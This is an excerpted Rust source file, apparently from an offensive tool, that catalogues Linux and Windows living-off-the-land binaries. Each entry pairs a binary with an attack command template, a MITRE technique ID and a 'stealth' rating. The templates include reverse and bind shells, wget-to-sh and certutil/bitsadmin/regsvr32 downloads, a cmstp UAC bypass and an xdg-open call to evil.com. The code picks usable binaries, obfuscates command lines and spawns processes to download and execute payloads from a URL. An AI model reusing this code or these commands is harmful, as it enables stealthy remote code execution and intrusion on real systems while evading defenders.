...
pub const LOLBINS: &[Lolbin] = &[
    ...
    Lolbin {
        name: "wget_download",
        binary: "wget",
        technique: "wget -qO- <url> | sh",
        mitre_id: "T1105",
        platform: "linux",
        stealth: 7,
    },
    Lolbin {
        name: "python_revshell",
        binary: "python3",
        technique: "python3 -c 'import os,pty,socket;...'",
        mitre_id: "T1059.006",
        platform: "linux",
        stealth: 8,
    },
    Lolbin {
        name: "openssl_revshell",
        binary: "openssl",
        technique: "openssl s_client -quiet -connect <host>:443",
        mitre_id: "T1573",
        platform: "linux",
        stealth: 9,
    },
    Lolbin {
        name: "ssh_tunnel",
        binary: "ssh",
        technique: "ssh -R 0:localhost:22 <host>",
        mitre_id: "T1572",
        platform: "linux",
        stealth: 9,
    },
    Lolbin {
        ...
        binary: "base64",
        technique: "echo <b64> | base64 -d | bash",
        mitre_id: "T1027",
        platform: "linux",
        stealth: 8,
    },
    Lolbin {
        name: "xxd_revshell",
        binary: "xxd",
        technique: "xxd -r -p <file> > /dev/shm/p && chmod +x /dev/shm/p && /dev/shm/p",
        mitre_id: "T1027",
        platform: "linux",
        stealth: 8,
    },
    Lolbin {
        name: "ncat_bind",
        binary: "ncat",
        technique: "ncat -lvp 443 -e /bin/bash",
        mitre_id: "T1571",
        platform: "linux",
        stealth: 5,
    },
    Lolbin {
        name: "awk_exec",
        binary: "awk",
        technique: "awk 'BEGIN {system(\"cmd\")}'",
        mitre_id: "T1059.004",
        platform: "linux",
        stealth: 7,
    },
    ...
    Lolbin {
        name: "ruby_exec",
        binary: "ruby",
        technique: "ruby -e 'exec \"cmd\"'",
        mitre_id: "T1059.004",
        platform: "linux",
        stealth: 7,
    },
    Lolbin {
        name: "gcc_compile_exec",
        binary: "gcc",
        technique: "gcc -xc -o /dev/shm/.o - && /dev/shm/.o",
        mitre_id: "T1027",
        platform: "linux",
        stealth: 6,
    },
    Lolbin {
        name: "socat_relay",
        binary: "socat",
        technique: "socat TCP-L:8080,fork EXEC:/bin/bash",
        mitre_id: "T1090",
        platform: "linux",
        stealth: 5,
    },
    Lolbin {
        name: "screen_log",
        binary: "screen",
        technique: "screen -dmS h bash -c 'cmd'",
        mitre_id: "T1059.004",
        platform: "linux",
        stealth: 8,
    },
    Lolbin {
        name: "tmux_session",
        binary: "tmux",
        technique: "tmux new-session -d -s h 'cmd'",
        mitre_id: "T1059.004",
        platform: "linux",
        stealth: 8,
    },
    ...
    Lolbin {
        name: "systemd_run",
        binary: "systemd-run",
        technique: "systemd-run --user --on-active=1 cmd",
        mitre_id: "T1543.002",
        platform: "linux",
        stealth: 9,
    },
    Lolbin {
        name: "dbus_send",
        binary: "dbus-send",
        technique: "dbus-send --system --dest=org.freedesktop.systemd1 ...",
        mitre_id: "T1543.002",
        platform: "linux",
        stealth: 9,
    },
    Lolbin {
        name: "xdg_open",
        binary: "xdg-open",
        technique: "xdg-open http://evil.com/payload",
        mitre_id: "T1204.002",
        platform: "linux",
        stealth: 8,
    },
    ...
    Lolbin {
        ...
        binary: "certutil.exe",
        technique: "certutil -urlcache -split -f <url> <out>",
        mitre_id: "T1105",
        platform: "windows",
        stealth: 8,
    },
    ...
    Lolbin {
        ...
        binary: "regsvr32.exe",
        technique: "regsvr32 /s /n /u /i:<url> scrobj.dll",
        mitre_id: "T1218.010",
        platform: "windows",
        stealth: 9,
    },
    Lolbin {
        name: "rundll32_exec",
        binary: "rundll32.exe",
        technique: "rundll32 javascript:\"\\..\\mshtml,RunHTMLApplication \"...",
        mitre_id: "T1218.011",
        platform: "windows",
        stealth: 8,
    },
    Lolbin {
        name: "wmic_exec",
        binary: "wmic.exe",
        technique: "wmic process call create \"cmd\"",
        mitre_id: "T1047",
        platform: "windows",
        stealth: 7,
    },
    ...
    Lolbin {
        ...
        technique: "bitsadmin /transfer <job> <url> <out>",
        mitre_id: "T1197",
        platform: "windows",
        stealth: 9,
    },
    Lolbin {
        name: "cmstp_uac_bypass",
        binary: "cmstp.exe",
        technique: "cmstp /s <inf_file>",
        mitre_id: "T1218.003",
        platform: "windows",
        stealth: 8,
    },
    ...
    Lolbin {
        name: "msbuild_exec",
        binary: "msbuild.exe",
        technique: "msbuild <proj_file>",
        mitre_id: "T1127.001",
        platform: "windows",
        stealth: 8,
    },
    Lolbin {
        name: "installutil_exec",
        binary: "installutil.exe",
        technique: "installutil /logfile= /LogToConsole=false /U <dll>",
        mitre_id: "T1218.004",
        platform: "windows",
        stealth: 8,
    },
...
pub fn discover_available() -> Vec<&'static Lolbin> {
    LOLBINS
        .iter()
        .filter(|lb| {
            if lb.platform == "windows" && !cfg!(target_os = "windows") {
                return false;
            }
            if lb.platform == "linux" && !cfg!(target_os = "linux") {
                return false;
            }
...
pub fn lolbin_download_exec(url: &str) -> bool {
    for lb in discover_available()
        .iter()
        .filter(|lb| lb.mitre_id == "T1105" || lb.name.contains("download"))
    {
        if lolbin_exec(lb, url) {
            return true;
        }
    }
    false
...
pub fn weaver_obfuscate(cmd: &str) -> String {
    ...
    if cmd.contains("powershell") || cmd.contains("cmd") {
        obfuscated = obfuscated
            .chars()
            .map(|c| {
                if c.is_ascii_alphabetic() && rand::random() {
    ...
    info!(
        "LOLBIN: obfuscated CLI: {}...",
        &obfuscated[..80.min(obfuscated.len())]
    );
    obfuscated
}
...
pub fn lolbin_exec_obfuscated(lolbin: &Lolbin, payload: &str) -> bool {
    ...
    match Command::new(binary).args(&args).spawn() {
        Ok(child) => {
            info!(
                "LOLBIN: {} executed (obfuscated, PID: {:?})",
                lolbin.name,
                child.id()
            );
            true
...
pub fn stealth_download_exec(url: &str) -> bool {
    let available: Vec<_> = discover_available()
        .into_iter()
...
mod tests {
    ...
    fn test_all_have_mitre() {
        for lb in LOLBINS {
            assert!(
                lb.mitre_id.starts_with("T"),
                "LOLBin {} missing MITRE ID",
                lb.name
            );
        }
    }
    ...
    fn test_discover_linux() {
        ...
        assert!(
            !available.is_empty() || !cfg!(target_os = "linux"),
